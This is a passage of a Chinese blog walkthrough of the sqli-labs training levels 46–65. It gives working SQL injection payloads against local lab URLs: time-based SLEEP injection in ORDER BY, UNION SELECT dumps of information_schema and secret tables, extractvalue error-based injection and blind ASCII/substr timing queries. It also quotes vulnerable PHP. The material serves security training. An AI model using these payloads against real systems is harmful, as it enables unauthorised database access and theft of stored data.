<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-46/?sort=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(5)))test">http://127.0.0.1/Less-46/?sort=if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(5)))test</a>))</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027163311478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>order by 也可以union 联合查询</p>
<blockquote>
<p>order by id ) union(select 1,(version()),3)</p>
</blockquote>
<p>有个条件前面得有个(   ctf有 实战没遇到过</p>
<h2 id="第47-48关"><a href="#第47-48关" class="headerlink" title="第47-48关:"></a>第47-48关:</h2><p>参考46关即可。</p>
<h2 id="第49关"><a href="#第49关" class="headerlink" title="第49关:"></a>第49关:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sql = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">if</span> ($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> $row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="第50-53关"><a href="#第50-53关" class="headerlink" title="第50-53关:"></a>第50-53关:</h2><p>均可参考46关。</p>
<h2 id="第54关"><a href="#第54关" class="headerlink" title="第54关:"></a>第54关:</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">            $sql=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">...</span><br><span class="line">$key = addslashes($_POST[<span class="string">&#x27;key&#x27;</span>]);</span><br><span class="line">    $key = mysql_real_escape_string($key);</span><br><span class="line">    <span class="comment">//echo $key;</span></span><br><span class="line">    <span class="comment">//Query table to verify your result</span></span><br><span class="line">    $sql=<span class="string">&quot;SELECT 1 FROM <span class="subst">$table</span> WHERE <span class="subst">$col1</span>= &#x27;<span class="subst">$key</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="comment">//echo &quot;$sql&quot;;</span></span><br><span class="line">    $result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;error in submittion of Key Solution&quot;</span>.mysql_error());</span><br><span class="line">     </span><br><span class="line">    $row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>payload：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-54/?id=0&#39;">http://127.0.0.1/Less-54/?id=0&#39;</a> union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’ –+</p>
</blockquote>
<pre><code> http://127.0.0.1/Less-54/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;qing&#39; --+

 http://127.0.0.1/Less-54/?id=0&#39; union select 1,group_concat(secret_qing),group_concat(sessid) from challenges.qing --+</code></pre>
<p>首先知道库名 challenges</p>
<p>查询表名</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-54/?id=-1&#39;">http://127.0.0.1/Less-54/?id=-1&#39;</a> union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’challenges’–+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027163936834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>列名和剩下的</p>
<blockquote>
<p>id=-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’842yxlmx7h’–+<br><a target="_blank" rel="noopener" href="http://127.0.0.1/Less-54/?id=-1&#39;union">http://127.0.0.1/Less-54/?id=-1&#39;union</a> select 1,2,group_concat(secret_KOB8) from challenges.842yxlmx7h–+</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/20201027164055617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201027164104632.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201027164116300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="第55-57关"><a href="#第55-57关" class="headerlink" title="第55-57关:"></a>第55-57关:</h2><p>大同54</p>
<h2 id="第58关："><a href="#第58关：" class="headerlink" title="第58关："></a>第58关：</h2><p>同54有一点区别而已 这关开始不返回数据库查询内容 不能union select   那就报错</p>
<blockquote>
<p>and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=‘7mu71b84nt’),0x7e))</p>
</blockquote>
<h2 id="第59-60关："><a href="#第59-60关：" class="headerlink" title="第59-60关："></a>第59-60关：</h2><p>同58</p>
<h2 id="第61关"><a href="#第61关" class="headerlink" title="第61关:"></a>第61关:</h2><p><img src="https://img-blog.csdnimg.cn/20201027164538390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NzU2OTcx,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<blockquote>
<p>-1’)) and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=‘challenges’),0x7e))–+</p>
</blockquote>
<h2 id="第62关"><a href="#第62关" class="headerlink" title="第62关:"></a>第62关:</h2><p>这里union注入和报错注入都不行</p>
<p>盲注 不多说</p>
<blockquote>
<p>)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=79,0,sleep(10))–+</p>
</blockquote>
<h2 id="第63-65关"><a href="#第63-65关" class="headerlink" title="第63-65关:"></a>第63-65关:</h2><p>同62</p>
<p>所有关卡就到此结束了，啦啦啦🤭</p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/10/19/sqli-labs%20Less%2011~20%20%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" rel="prev" title="sqli-labs 11~20关通关教程">
      <i class="fa fa-chevron-left"></i> sqli-labs 11~20关通关教程
    </a></div>
      <div class="post-nav-item">
    <a href="/2020/10/22/Bwapp%E5%B9%B3%E5%8F%B0%E7%9A%84%E4%BB%8B%E7%BB%8D%E4%B8%8E%E6%90%AD%E5%BB%BA%E6%96%B9%E6%B3%95/" rel="next" title="Bwapp平台的介绍与搭建方法">
      Bwapp平台的介绍与搭建方法 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%80%E5%85%B3%EF%BC%9A"><span class="nav-number">1.</span> <span class="nav-text">第二十一关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="nav-number">2.</span> <span class="nav-text">第二十二关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%89%E5%85%B3%EF%BC%9A"><span class="nav-number">3.</span> <span class="nav-text">第二十三关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E5%8D%81%E5%9B%9B%E5%85%B3%EF%BC%9A"><span class="nav-number">4.</span> <span class="nav-text">二十四关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%94%E5%85%B3"><span class="nav-number">5.</span> <span class="nav-text">第二十五关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25a%EF%BC%9A"><span class="nav-number">6.</span> <span class="nav-text">25a：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-number">7.</span> <span class="nav-text">第二十六关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#26a%EF%BC%9A"><span class="nav-number">8.</span> <span class="nav-text">26a：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B8%83%E5%85%B3%EF%BC%9A"><span class="nav-number">9.</span> <span class="nav-text">第二十七关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#27a%EF%BC%9A"><span class="nav-number">10.</span> <span class="nav-text">27a：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%AB%E5%85%B3%EF%BC%9A"><span class="nav-number">11.</span> <span class="nav-text">第二十八关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#28a"><span class="nav-number">12.</span> <span class="nav-text">28a:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%B9%9D%E5%85%B3"><span class="nav-number">13.</span> <span class="nav-text">第二十九关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%B3%EF%BC%9A"><span class="nav-number">14.</span> <span class="nav-text">第三十关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%80%E5%85%B3"><span class="nav-number">15.</span> <span class="nav-text">第三十一关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%8C%E5%85%B3%EF%BC%9A"><span class="nav-number">16.</span> <span class="nav-text">第三十二关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC33-34%E5%85%B3%EF%BC%9A"><span class="nav-number">17.</span> <span class="nav-text">第33-34关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%BA%94%E5%85%B3%EF%BC%9A"><span class="nav-number">18.</span> <span class="nav-text">第三十五关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AD%E5%85%B3%EF%BC%9A"><span class="nav-number">19.</span> <span class="nav-text">第三十六关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E4%B8%83%E5%85%B3"><span class="nav-number">20.</span> <span class="nav-text">第三十七关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E5%8D%81%E5%85%AB%E5%85%B3"><span class="nav-number">21.</span> <span class="nav-text">第三十八关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#39-43"><span class="nav-number">22.</span> <span class="nav-text">39-43:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC44%E5%85%B3"><span class="nav-number">23.</span> <span class="nav-text">第44关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC45%E5%85%B3"><span class="nav-number">24.</span> <span class="nav-text">第45关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC46%E5%85%B3"><span class="nav-number">25.</span> <span class="nav-text">第46关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC47-48%E5%85%B3"><span class="nav-number">26.</span> <span class="nav-text">第47-48关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC49%E5%85%B3"><span class="nav-number">27.</span> <span class="nav-text">第49关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC50-53%E5%85%B3"><span class="nav-number">28.</span> <span class="nav-text">第50-53关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC54%E5%85%B3"><span class="nav-number">29.</span> <span class="nav-text">第54关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC55-57%E5%85%B3"><span class="nav-number">30.</span> <span class="nav-text">第55-57关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC58%E5%85%B3%EF%BC%9A"><span class="nav-number">31.</span> <span class="nav-text">第58关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC59-60%E5%85%B3%EF%BC%9A"><span class="nav-number">32.</span> <span class="nav-text">第59-60关：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC61%E5%85%B3"><span class="nav-number">33.</span> <span class="nav-text">第61关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC62%E5%85%B3"><span class="nav-number">34.</span> <span class="nav-text">第62关:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC63-65%E5%85%B3"><span class="nav-number">35.</span> <span class="nav-text">第63-65关:</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">blank-admure</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">12</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2020.10.06 – 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">blank-admure</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>


  <script defer src="/lib/three/three.min.js"></script>
    <script defer src="/lib/three/three-waves.min.js"></script>


  















  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'L9pqya1Hhf0bHAFvfr26BFun-gzGzoHsz',
      appKey     : 'WMnNAV2J6llhDQ2y4HtABX0E',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

  <!-- 引入jQuery -->
<script type="text/javascript" src="//libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
  <!-- 雪花特效 -->
<script type="text/javascript" src="/js/snow.js"></script>
<script type="text/javascript" src="/js/love.js"></script>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
